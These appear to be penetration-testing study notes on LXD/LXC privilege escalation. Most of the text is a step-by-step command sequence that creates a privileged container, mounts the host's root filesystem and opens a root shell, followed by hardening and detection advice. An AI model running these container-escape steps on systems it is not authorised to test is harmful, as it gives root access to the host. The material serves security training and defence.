## LXC Privilege Escalation Techniques

### Check Group Membership

Check if the user is part of the `lxd` group, which may allow container escapes.

```bash
id
```

### List Available LXC Images

View available LXC images for deployment.

```bash
lxc image list
```

### List Available LXD Containers

Check running or existing LXD containers.

```bash
lxc list
```

### Import a Vulnerable LXC Image

Import a vulnerable LXC image for privilege escalation.

```bash
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
```

### Initialize a Privileged LXC Container

Create a new privileged container that may allow access to the host.

```bash
lxc init ubuntutemp privesc -c security.privileged=true
```

### Mount the Host's Root Filesystem into the Container

Bind the host's root filesystem inside the container.

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

### Start the LXC Container

```bash
lxc start privesc
```

### Execute a Shell Inside the Container

Gain access to the container's shell.

```bash
lxc exec privesc /bin/bash
```

### Access the Host's Root Filesystem from Inside the Container

```bash
ls -l /mnt/root
```

### Mount Host Root to a Running Container

If a container is already running, mount the host's root filesystem dynamically.

```bash
lxc config device add <container_name> host-root disk source=/ path=/mnt/root recursive=true
```

### Execute a Shell in an Existing Container

```bash
lxc exec <container_name> /bin/bash
```

### Access the Host Root Filesystem

```bash
ls -l /mnt/root
```

### Check If a Container is Privileged

Determine if a container is running with elevated privileges.

```bash
lxc config show <container_name> | grep security.privileged
```

### List LXD Profiles

View existing LXD profiles that define container configurations.

```bash
lxc profile list
```

### Show the Configuration of a Given LXD Profile

Inspect the configuration of a specific profile.

```bash
lxc profile show <profile_name>
```


### **Key Concepts:**

- **Containers vs. VMs:** You correctly highlighted the difference between OS-level virtualization (containers) and hardware-level virtualization (VMs).
- **LXC/LXD:**
    - LXC: Application containers, sharing the host kernel.
    - LXD: System containers, running a complete OS.
- **Privilege Escalation:** The primary goal is to escape the container and gain root access on the host system.
- **LXD Group:** Membership in the `lxd` or `lxc` group is often a prerequisite for exploiting LXD.
- **Vulnerable Templates:** Pre-existing container templates with weak security configurations (e.g., no passwords, privileged settings) are often the attack vector.
- **`security.privileged=true`:** This is the critical setting that disables container isolation, allowing access to the host.
- **Host Root Mounting:** Mounting the host's root filesystem into the container allows direct access to host files.

### **Exploitation Steps (as described):**

1. **Check Group Membership:** `id`
2. **Locate Vulnerable Templates:** `ls` in relevant directories.
3. **Import the Image:** `lxc image import ubuntu-template.tar.xz --alias ubuntutemp`
4. **List Images:** `lxc image list`
5. **Initialize a Privileged Container:** `lxc init ubuntutemp privesc -c security.privileged=true`
6. **Mount Host Root:** `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`
7. **Start the Container:** `lxc start privesc`
8. **Execute a Shell:** `lxc exec privesc /bin/bash`
9. **Access Host Files:** `ls -l /mnt/root`

### **Important Considerations and Enhancements:**

- **Security Best Practices:**
    - Avoid using privileged containers unless absolutely necessary.
    - Use strong passwords for container images.
    - Regularly update container images.
    - Implement proper access controls.
    - Use namespaces and cgroups to further isolate containers.
- **Attack Vectors:**
    - Besides vulnerable templates, other attack vectors include exploiting vulnerabilities in the LXD daemon itself or misconfigurations in container profiles.
    - Exploiting mounted volumes that are not the root directory.
- **Capabilities:** Container escape can also happen by abusing linux capabilities.
- **Detection:**
    - Monitor for unusual container activity.
    - Audit container configurations.
    - Use security tools to scan for vulnerabilities.
- **Containerization Security:**
    - Understanding container security is crucial in modern IT environments.
    - Tools like Docker Bench for Security and Lynis can help assess container security.
- **Namespaces:** Reinforce the importance of namespaces in container security.
- **Cgroups:** Reinforce the importance of Cgroups in container security.
- **Real World Examples:** Researching real world container escapes will help solidify understanding of the attack vectors.
- **LXD profiles:** Understanding how LXD profiles work, and how they can be misconfigured is very important.
